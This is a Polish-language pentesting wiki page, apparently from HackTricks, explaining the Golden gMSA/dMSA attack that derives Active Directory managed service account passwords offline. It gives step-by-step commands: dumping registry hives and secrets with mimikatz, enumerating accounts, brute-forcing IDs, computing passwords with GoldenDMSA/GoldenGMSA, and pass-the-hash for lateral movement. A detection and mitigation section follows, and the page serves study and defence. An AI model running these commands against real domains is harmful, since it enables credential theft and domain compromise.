# Złoty gMSA/dMSA Atak (Offline Derivacja Haseł Kont Usług Zarządzanych)

{{#include ../../banners/hacktricks-training.md}}

## Przegląd

Windows Managed Service Accounts (MSA) to specjalne podmioty zaprojektowane do uruchamiania usług bez potrzeby ręcznego zarządzania ich hasłami. Istnieją dwa główne rodzaje:

1. **gMSA** – grupowe Konto Usługi Zarządzanej – może być używane na wielu hostach, które są autoryzowane w jego atrybucie `msDS-GroupMSAMembership`.
2. **dMSA** – delegowane Konto Usługi Zarządzanej – (w wersji beta) następca gMSA, oparty na tej samej kryptografii, ale pozwalający na bardziej szczegółowe scenariusze delegacji.

Dla obu wariantów **hasło nie jest przechowywane** na każdym Kontrolerze Domeny (DC) jak zwykły NT-hash. Zamiast tego każdy DC może **wyprowadzić** aktualne hasło na bieżąco z:

* Klucza **KDS Root Key** w całym lesie (`KRBTGT\KDS`) – losowo generowany sekret o nazwie GUID, replikowany do każdego DC w kontenerze `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`.
* **SID** docelowego konta.
* **ManagedPasswordID** (GUID) na poziomie konta, znajdującego się w atrybucie `msDS-ManagedPasswordId`.

Derivacja to: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 240-bajtowy blob, który jest ostatecznie **zakodowany w base64** i przechowywany w atrybucie `msDS-ManagedPassword`. Nie jest wymagany żaden ruch Kerberos ani interakcja z domeną podczas normalnego użycia hasła – host członkowski wyprowadza hasło lokalnie, o ile zna trzy wejścia.

## Złoty gMSA / Złoty dMSA Atak

Jeśli atakujący może uzyskać wszystkie trzy wejścia **offline**, może obliczyć **ważne aktualne i przyszłe hasła** dla **dowolnego gMSA/dMSA w lesie** bez ponownego dotykania DC, omijając:

* Audyt odczytu LDAP
* Interwały zmiany hasła (mogą je wstępnie obliczyć)

Jest to analogiczne do *Złotego Biletu* dla kont usługowych.

### Wymagania wstępne

1. **Kompromitacja na poziomie lasu** **jednego DC** (lub Administratora Enterprise), lub dostęp `SYSTEM` do jednego z DC w lesie.
2. Możliwość enumeracji kont usługowych (odczyt LDAP / brute-force RID).
3. Stacja robocza .NET ≥ 4.7.2 x64 do uruchomienia [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) lub równoważnego kodu.

### Złoty gMSA / dMSA
##### Faza 1 – Ekstrakcja Klucza KDS Root

Zrzut z dowolnego DC (Kopia Cienia Woluminu / surowe hives SAM+SECURITY lub zdalne sekrety):
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
Ciąg base64 oznaczony jako `RootKey` (nazwa GUID) jest wymagany w późniejszych krokach.

##### Faza 2 – Enumeracja obiektów gMSA / dMSA

Pobierz przynajmniej `sAMAccountName`, `objectSid` i `msDS-ManagedPasswordId`:
```powershell
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implementuje tryby pomocnicze:
```powershell
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Faza 3 – Zgadnij / Odkryj ManagedPasswordID (gdy brakuje)

Niektóre wdrożenia *usuwają* `msDS-ManagedPasswordId` z odczytów chronionych przez ACL. 
Ponieważ GUID ma 128 bitów, naiwne brute force jest niepraktyczne, ale:

1. Pierwsze **32 bity = czas epoki Unix** utworzenia konta (rozdzielczość minutowa).
2. Następnie 96 losowych bitów.

Dlatego **wąska lista słów dla każdego konta** (± kilka godzin) jest realistyczna.
```powershell
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
Narzędzie oblicza kandydatów na hasła i porównuje ich blob base64 z rzeczywistym atrybutem `msDS-ManagedPassword` – dopasowanie ujawnia poprawny GUID.

##### Faza 4 – Offline Obliczanie Hasła i Konwersja

Gdy ManagedPasswordID jest znane, ważne hasło jest na wyciągnięcie ręki:
```powershell
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
Wynikowe hashe mogą być wstrzykiwane za pomocą **mimikatz** (`sekurlsa::pth`) lub **Rubeus** w celu nadużycia Kerberos, co umożliwia ukryty **lateral movement** i **persistence**.

## Wykrywanie i łagodzenie

* Ogranicz możliwości **DC backup i odczytu rejestru** do administratorów Tier-0.
* Monitoruj tworzenie **Directory Services Restore Mode (DSRM)** lub **Volume Shadow Copy** na DC.
* Audytuj odczyty / zmiany `CN=Master Root Keys,…` oraz flag `userAccountControl` kont serwisowych.
* Wykrywaj nietypowe **base64 password writes** lub nagłe ponowne użycie haseł serwisowych na różnych hostach.
* Rozważ konwersję gMSA o wysokich uprawnieniach na **klasyczne konta serwisowe** z regularnymi losowymi rotacjami, gdy izolacja Tier-0 nie jest możliwa.

## Narzędzia

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – implementacja referencyjna używana na tej stronie.
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – implementacja referencyjna używana na tej stronie.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket przy użyciu pochodnych kluczy AES.

## Odniesienia

- [Golden dMSA – obejście uwierzytelniania dla delegowanych zarządzanych kont serwisowych](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [gMSA Ataki na konta Active Directory](https://www.semperis.com/blog/golden-gmsa-attack/)
- [Repozytorium GitHub Semperis/GoldenDMSA](https://github.com/Semperis/GoldenDMSA)
- [Improsec – atak zaufania Golden gMSA](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)

{{#include ../../banners/hacktricks-training.md}}
